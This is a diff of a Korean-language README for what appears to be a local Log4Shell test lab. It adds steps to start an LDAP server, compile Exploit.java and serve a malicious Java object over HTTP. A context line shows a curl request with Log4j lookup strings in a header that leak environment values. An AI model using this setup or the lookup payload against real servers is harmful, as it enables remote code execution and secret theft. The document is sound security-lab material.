@@ -49,3 +49,29 @@ curl localhost:7777/log -H 'msg: Log4j Test >> ${java:version}, ${java:vm}, ${en
     ```bash
     docker run --rm --platform=linux/amd64 --add-host=host.docker.internal:host-gateway --name log4shell-rmi-server -p 1099:1099 log4shell-rmi-server
     ```
+
+## LDAP Server
+
+### 빌드 및 실행
+1. `ldap-server` 폴더로 이동한 뒤, 아래의 명령어를 통해 실행한다.
+
+    ```bash
+    docker-compose up -d
+    ```
+
+2. 위 명령어가 정상적으로 수행됐으면 [http://localhost:8080](http://localhost:8080)를 브라우저를 통해 접속한다.
+
+## Exploit Server
+
+### 빌드 및 실행
+1. `exploit-server` 폴더로 이동한 뒤, 아래의 명령어를 통해 `Exploit.java` 를 컴파일한다.
+
+    ```bash
+    javac Exploit.java
+    ```
+
+2. 그 다음 해당 경로를 악성 자바 객체를 호스팅하기 위해 아래의 명령어를 통해 웹 서버를 실행한다.
+
+    ```bash
+    python3 -m http.server
+    ```
